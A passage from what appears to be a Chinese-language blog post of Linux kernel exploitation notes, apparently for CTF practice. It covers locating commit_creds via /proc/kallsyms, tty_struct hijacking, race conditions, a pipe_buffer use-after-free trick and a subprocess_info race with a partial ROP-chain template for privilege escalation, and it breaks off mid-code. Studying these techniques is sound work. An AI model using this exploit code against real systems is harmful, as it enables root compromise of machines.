buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred) </span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;	</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>注意：如果在 init 文件中看到如下代码，就不能通过 /proc/kallsyms 查看函数地址了</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict # 设置kptr_restrict为&#x27;1&#x27;</span><br></pre></td></tr></table></figure>
<h2 id="tty-struct-attack"><a href="#tty-struct-attack" class="headerlink" title="tty_struct attack"></a>tty_struct attack</h2><p>在 <code>open(&quot;/dev/ptmx&quot;, O_RDWR)</code> 时会分配这样一个结构体：tty_struct </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> magic;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">    <span class="keyword">spinlock_t</span> ctrl_lock;</span><br><span class="line">    <span class="keyword">spinlock_t</span> flow_lock;</span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span>    <span class="comment">/* May be NULL for unsupported */</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span>       <span class="comment">/* Protected by ctrl lock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>     <span class="comment">/* winsize_mutex */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stopped:<span class="number">1</span>,    <span class="comment">/* flow_lock */</span></span><br><span class="line">              flow_stopped:<span class="number">1</span>,</span><br><span class="line">              unused:BITS_PER_LONG - <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> hw_stopped;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ctrl_status:<span class="number">8</span>,    <span class="comment">/* ctrl_lock */</span></span><br><span class="line">              packet:<span class="number">1</span>,</span><br><span class="line">              unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> receive_room;  <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">    <span class="keyword">int</span> flow_change;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> write_wait;</span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> read_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *disc_data;</span><br><span class="line">    <span class="keyword">void</span> *driver_data;</span><br><span class="line">    <span class="keyword">spinlock_t</span> files_lock;      <span class="comment">/* protects tty_files list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line">    <span class="keyword">int</span> closing;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *write_buf;</span><br><span class="line">    <span class="keyword">int</span> write_cnt;</span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<p>另一个很有趣的结构体：<code>tty_operations</code>（<code>tty_struct[4]</code>）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write)(struct tty_struct * tty,</span><br><span class="line">              <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">    <span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">                 <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*stop)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line">                struct serial_icounter_struct *icount);</span><br><span class="line">    <span class="keyword">void</span> (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="keyword">int</span> (*poll_init)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> *options);</span><br><span class="line">    <span class="keyword">int</span> (*poll_get_char)(struct tty_driver *driver, <span class="keyword">int</span> line);</span><br><span class="line">    <span class="keyword">void</span> (*poll_put_char)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> (*proc_show)(struct seq_file *, <span class="keyword">void</span> *);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<ul>
<li>全是函数指针，每一个都可以用来劫持</li>
<li>劫持过后，就可以通过调用对应的函数来执行我们想要的代码了</li>
</ul>
<h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><p>条件竞争就是两个或者多个进程或者线程同时处理一个资源（全局变量，文件）产生非预想的执行效果，从而产生程序执行流的改变，从而达到攻击的目的</p>
<p>条件竞争需要如下的条件：</p>
<ul>
<li>并发，即至少存在两个并发执行流：<ul>
<li>这里的执行流包括线程，进程，任务等级别的执行流</li>
</ul>
</li>
<li>共享对象，即多个并发流会访问同一对象：<ul>
<li>常见的共享对象有共享内存，文件系统，信号，一般来说，这些共享对象是用来使得多个程序执行流相互交流</li>
<li>此外，我们称访问共享对象的代码为临界区，在正常写代码时，这部分应该加锁</li>
</ul>
</li>
<li>改变对象，即至少有一个控制流会改变竞争对象的状态：因为如果程序只是对对象进行读操作，那么并不会产生条件竞争</li>
</ul>
<p>案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> counter;</span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">IncreaseCounter</span><span class="params">(<span class="keyword">void</span>* args)</span> </span>&#123;</span><br><span class="line">    counter += <span class="number">1</span>;</span><br><span class="line">    sleep(<span class="number">0.1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Thread %d has counter value %d\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)pthread_self(), counter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> p[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        pthread_create(&amp;p[i], <span class="literal">NULL</span>, IncreaseCounter, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        pthread_join(p[i], <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>创建10个线程，常理说应该线程应该按从小到大的顺序输出相应顺序的数字，但是由于 counter 是全局共享的资源，在 race window 的间隙里面可能多个线程对 counter 进行写、读操作，导致输出结果很难预料，如下： （多次尝试的结果还不同）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> gcc test.c -o test -pthread</span><br><span class="line">➜  <span class="built_in">exp</span> ./test </span><br><span class="line">Thread <span class="number">-967665920</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">-1043200256</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">-1034807552</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">-976058624</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">-1026414848</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">-984451328</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">-992844032</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">-1009629440</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">-1001236736</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">-1018022144</span> has counter value <span class="number">10</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./test</span><br><span class="line">Thread <span class="number">1636828928</span> has counter value <span class="number">5</span></span><br><span class="line">Thread <span class="number">1586472704</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">1594865408</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">1603258112</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">1569687296</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">1578080000</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">1628436224</span> has counter value <span class="number">5</span></span><br><span class="line">Thread <span class="number">1645221632</span> has counter value <span class="number">5</span></span><br><span class="line">Thread <span class="number">1611650816</span> has counter value <span class="number">6</span></span><br><span class="line">Thread <span class="number">1620043520</span> has counter value <span class="number">8</span></span><br></pre></td></tr></table></figure>
<h2 id="pipe-trick"><a href="#pipe-trick" class="headerlink" title="pipe trick"></a>pipe trick</h2><p>pipe 的读和写没有专门的函数，直接使用 write 和 read 操作之前 pipe 返回的文件描述符即可，pipefd[1] 用来写，pipefd[0] 用来读</p>
<p>结构体如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> wait; <span class="comment">/* 等待队列,用于存储正在等待管道可读或者可写的进程 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> nrbufs; <span class="comment">/* 表示未读数据已经占用了环形缓冲区的多少个内存页 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> curbuf; <span class="comment">/* 表示当前正在读取环形缓冲区的哪个内存页中的数据 */</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> readers; <span class="comment">/* 表示正在读取管道的进程数 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> writers; <span class="comment">/* 表示正在写入管道的进程数 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> waiting_writers; <span class="comment">/* 表示等待管道可写的进程数 */</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span>;</span> <span class="comment">/* 与管道关联的inode对象 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">bufs</span>[16];</span> <span class="comment">/* 管道缓冲区 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span> <span class="comment">/* 指向包含管道缓冲区数据的页面 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len; <span class="comment">/* 页面内数据的偏移量,长度 */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span> <span class="comment">/* 与此缓冲区关联的操作 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> flags; <span class="comment">/* 管道缓冲区标志 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>; <span class="comment">/* 运维人员拥有的私有数据 */</span></span><br><span class="line">&#125;;   </span><br></pre></td></tr></table></figure>
<p>关于这个 pipe_buffer，有个小 trick：</p>
<ul>
<li>使用 write(pfd[1],buf,0x100)，就是使用管道传输信息<ul>
<li>write(pfd[1],buf,0x100) 执行之前，offset = 0，len = 0</li>
<li>write(pfd[1],buf,0x100) 执行之后，offset = 0，len = 0x100</li>
</ul>
</li>
<li>offset 和 len 都是4字节数据，如果把它们拼在一起，凑成8字节，就是 0x10000000000</li>
<li>如果我们用 UAF，使其 pipe_buffer 和另一个结构体重合，那么该结构体对应位置也会变为 0x10000000000</li>
<li>如果该结构体与内存管理有关，并且该位表示 size 的话，就可以造成堆溢出 </li>
</ul>
<h2 id="subprocess-info-attack"><a href="#subprocess-info-attack" class="headerlink" title="subprocess_info attack"></a>subprocess_info attack</h2><p>使用以下语句：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket(<span class="number">22</span>, AF_INET, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<p>会触发 <code>struct subprocess_info</code> 这个对象的分配，此结构为0x60大小，定义如下： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">completion</span> *<span class="title">complete</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *path;</span><br><span class="line">    <span class="keyword">char</span> **argv;</span><br><span class="line">    <span class="keyword">char</span> **envp;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="keyword">int</span> wait;</span><br><span class="line">    <span class="keyword">int</span> retval;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> (*init)(struct subprocess_info *info, struct cred *<span class="keyword">new</span>);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct subprocess_info *info);</span><br><span class="line">    <span class="keyword">void</span> *data;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<p>此对象在分配时最终会调用 cleanup 函数，如果我们能在分配过程中把 cleanup 指针劫持为我们的 gadget，就能控制RIP，劫持的方法显而易见，即条件竞争</p>
<p>模板：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">race</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> *info = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)arg;</span><br><span class="line">  info[<span class="number">0</span>] = (<span class="keyword">u_int64_t</span>)xchg_eax_esp; </span><br><span class="line">    </span><br><span class="line">  <span class="keyword">u_int64_t</span> hijacked_stack_addr = ((<span class="keyword">u_int64_t</span>)xchg_eax_esp &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] hijacked_stack: %p\n&quot;</span>, (<span class="keyword">char</span> *)hijacked_stack_addr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span>* fake_stack = <span class="literal">NULL</span>; </span><br><span class="line">  <span class="keyword">if</span>((fake_stack = mmap((<span class="keyword">char</span>*)((hijacked_stack_addr &amp; (~<span class="number">0xfff</span>))),<span class="number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>)) == MAP_FAILED)</span><br><span class="line">      perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] fake_stack addr: %p\n&quot;</span>, fake_stack);</span><br><span class="line"></span><br><span class="line">  fake_stack[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">u_int64_t</span>* hijacked_stack_ptr = (<span class="keyword">u_int64_t</span>*)hijacked_stack_addr;</span><br><span class="line">  <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">  hijacked_stack_ptr[index++] = pop_rdi;</span><br><span class="line">  hijacked_stack_ptr[index++] = <span class="number">0</span>;</span><br><span class="line">  hijacked_stack_ptr[index++] = prepare_kernel_cred;</span><br><span class="line">  hijacked_stack_ptr[index++] = mov_rdi_rax_je_pop_pop_ret;</span><br><span 